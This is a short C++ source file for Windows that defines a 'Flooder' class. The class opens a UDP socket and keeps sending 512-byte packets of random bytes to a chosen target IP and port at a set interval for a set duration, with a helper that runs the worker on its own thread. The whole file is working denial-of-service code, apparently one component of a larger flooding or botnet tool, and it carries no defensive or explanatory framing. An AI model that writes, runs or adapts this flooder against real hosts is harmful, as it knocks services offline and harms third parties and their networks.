#include "flooder.h"

Flooder::Flooder(LPSTR target, DWORD port, DWORD interval, DWORD duration) {
  if (WSAStartup(MAKEWORD(2, 2), &wsadata_) != 0) {
    exit(0);
  }

  target_ = target;
  port_ = port;
  interval_ = interval;
  duration_ = duration;
}

Flooder::~Flooder() {
  closesocket(flood_socket_);
  WSACleanup();
}

void Flooder::Worker() {
  SOCKADDR_IN server_address;

  if (flood_socket_ == NULL) {
    flood_socket_ = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (flood_socket_ == INVALID_SOCKET) {
      return;
    }
  }

  memset(&server_address, NULL, sizeof(server_address));
  server_address.sin_family = AF_INET;
  server_address.sin_port = htons(port_);
  inet_pton(AF_INET, target_, &server_address.sin_addr);

  CHAR payload[512] = {
      0x00,
  };
  for (DWORD i = 0; i < 512; i++) {
    payload[i] = rand() % 256;
  }

  clock_t started_time = clock();
  while ((clock() - started_time) / CLOCKS_PER_SEC < duration_) {
    sendto(flood_socket_, payload, 512, 0, (SOCKADDR*)&server_address,
           sizeof(server_address));
    Sleep(interval_);
  }
}

std::thread Flooder::WorkerThread() {
  return std::thread(&Flooder::Worker, this);
}